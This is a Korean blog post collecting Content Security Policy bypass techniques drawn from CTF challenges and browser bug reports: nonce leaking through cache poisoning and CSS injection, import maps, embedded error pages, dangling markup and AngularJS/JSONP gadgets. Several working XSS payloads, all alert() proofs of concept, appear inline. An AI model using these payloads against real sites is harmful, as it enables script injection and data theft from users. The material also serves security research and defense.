---
title: "CSP Bypass 기법"
description: "Content Security Policy를 우회하는 다양한 기법 정리"
date: 2019-11-10
tags: ["web-security", "csp", "bypass", "xss"]
category: "Security Research"
published: true
---

**codegate 2020 CSP 문제 풀다가 관련 우회기법 정리해야겠다 싶어서 대충 정리해서 올려봅니다.**


**추가로 알게되는 정보가 있으면 업데이트 할게요~~**


---


**CTFZone 2019**


**- Script nonce : cache poisoning**


* /index.php/ 등을 이용해 cache poisoning  하여 csp script nonce를 고정


**Codegate 2020**


**- Script none : Header Injection - Status Code 102**


* Status Code 102 일때는 CSP가 동작하지 않는점을 이용


* header("HTTP/: 102");


--


*** Script nonce : css injection의 정규표현식으로 attribute에 접근 할 수 있는 것을 이용, 한글자씩 searching 해서 script nonce를 가져옴**


[https://lbherrera.me/solver.html](https://lbherrera.me/solver.html)


[http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html](http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html)


*** chromium 74 dev**


**- import maps 이용 csp bypass**


[https://bugs.chromium.org/p/chromium/issues/detail?id=941340](https://bugs.chromium.org/p/chromium/issues/detail?id=941340)


[https://test.shhnjk.com/imap.php](https://test.shhnjk.com/imap.php)


*** chromium 78**


[https://test.shhnjk.com/unxssable.php?xss=%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(origin);window.stop()%3C/script%3E%3Cmeta%20http-equiv=refresh%20content=%270;url=https://shhnjk.azurewebsites.net/csp_srcdoc.html%27%3E%22%3E%3C/iframe%3E](https://test.shhnjk.com/unxssable.php?xss=%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(origin);window.stop()%3C/script%3E%3Cmeta%20http-equiv=refresh%20content=%270;url=https://shhnjk.azurewebsites.net/csp_srcdoc.html%27%3E%22%3E%3C/iframe%3E)


@shhnjk


`<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>`


@akita_zen


`<script ?/src="data:+,\u0061lert%281%29">/</script>`


@404death


*** 동일 및 신뢰 도메인에서 스크립트 실행이 가능한 페이지에서 불가능한 페이지에 스크립트를 실행시켜야 할 때**


- Same or Trusted domain ( script-src 'self' // script-src 'a.com' )


- script-src 'self' unsafe-inline


- nginx 400 error, favicon.ico / robots.txt 등의 404 페이지를 임베딩해서 스크립트 삽입 가능


![image](/images/posts/csp-bypass-techniques_6ac0a7e5.jpg)


- Request URI Too Big 에러도 활용 가능


- Cookie max size 에러도 활용 가능


[https://www.slideshare.net/ssusera0a306/volgactf-2018-neatly-bypassing-csp](https://www.slideshare.net/ssusera0a306/volgactf-2018-neatly-bypassing-csp)


*** Click Jacking 비슷하게 dangling markup을 이용한 csp bypass(라기보단 dom code 내 중요정보 탈취쯤 될듯)**


[http://portswigger-labs.net/dangling_markup/?x=%3Ca%20href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html%3E%3Cfont%20size=100%20color=red%3EYou%20must%20click%20me%3C/font%3E%3C/a%3E%3Cbase%20target=%22blah](http://portswigger-labs.net/dangling_markup/?x=%3Ca%20href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html%3E%3Cfont%20size=100%20color=red%3EYou%20must%20click%20me%3C/font%3E%3C/a%3E%3Cbase%20target=%22blah)


*** angular js 등 front-end framework의 cdn을 이용한 csp bypass**


`<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26 ..`


`ng-app"ng-csp ng-click=$event.view.alert(1337)><script src =//ajax.googleapis.com/ajax ...`


etc...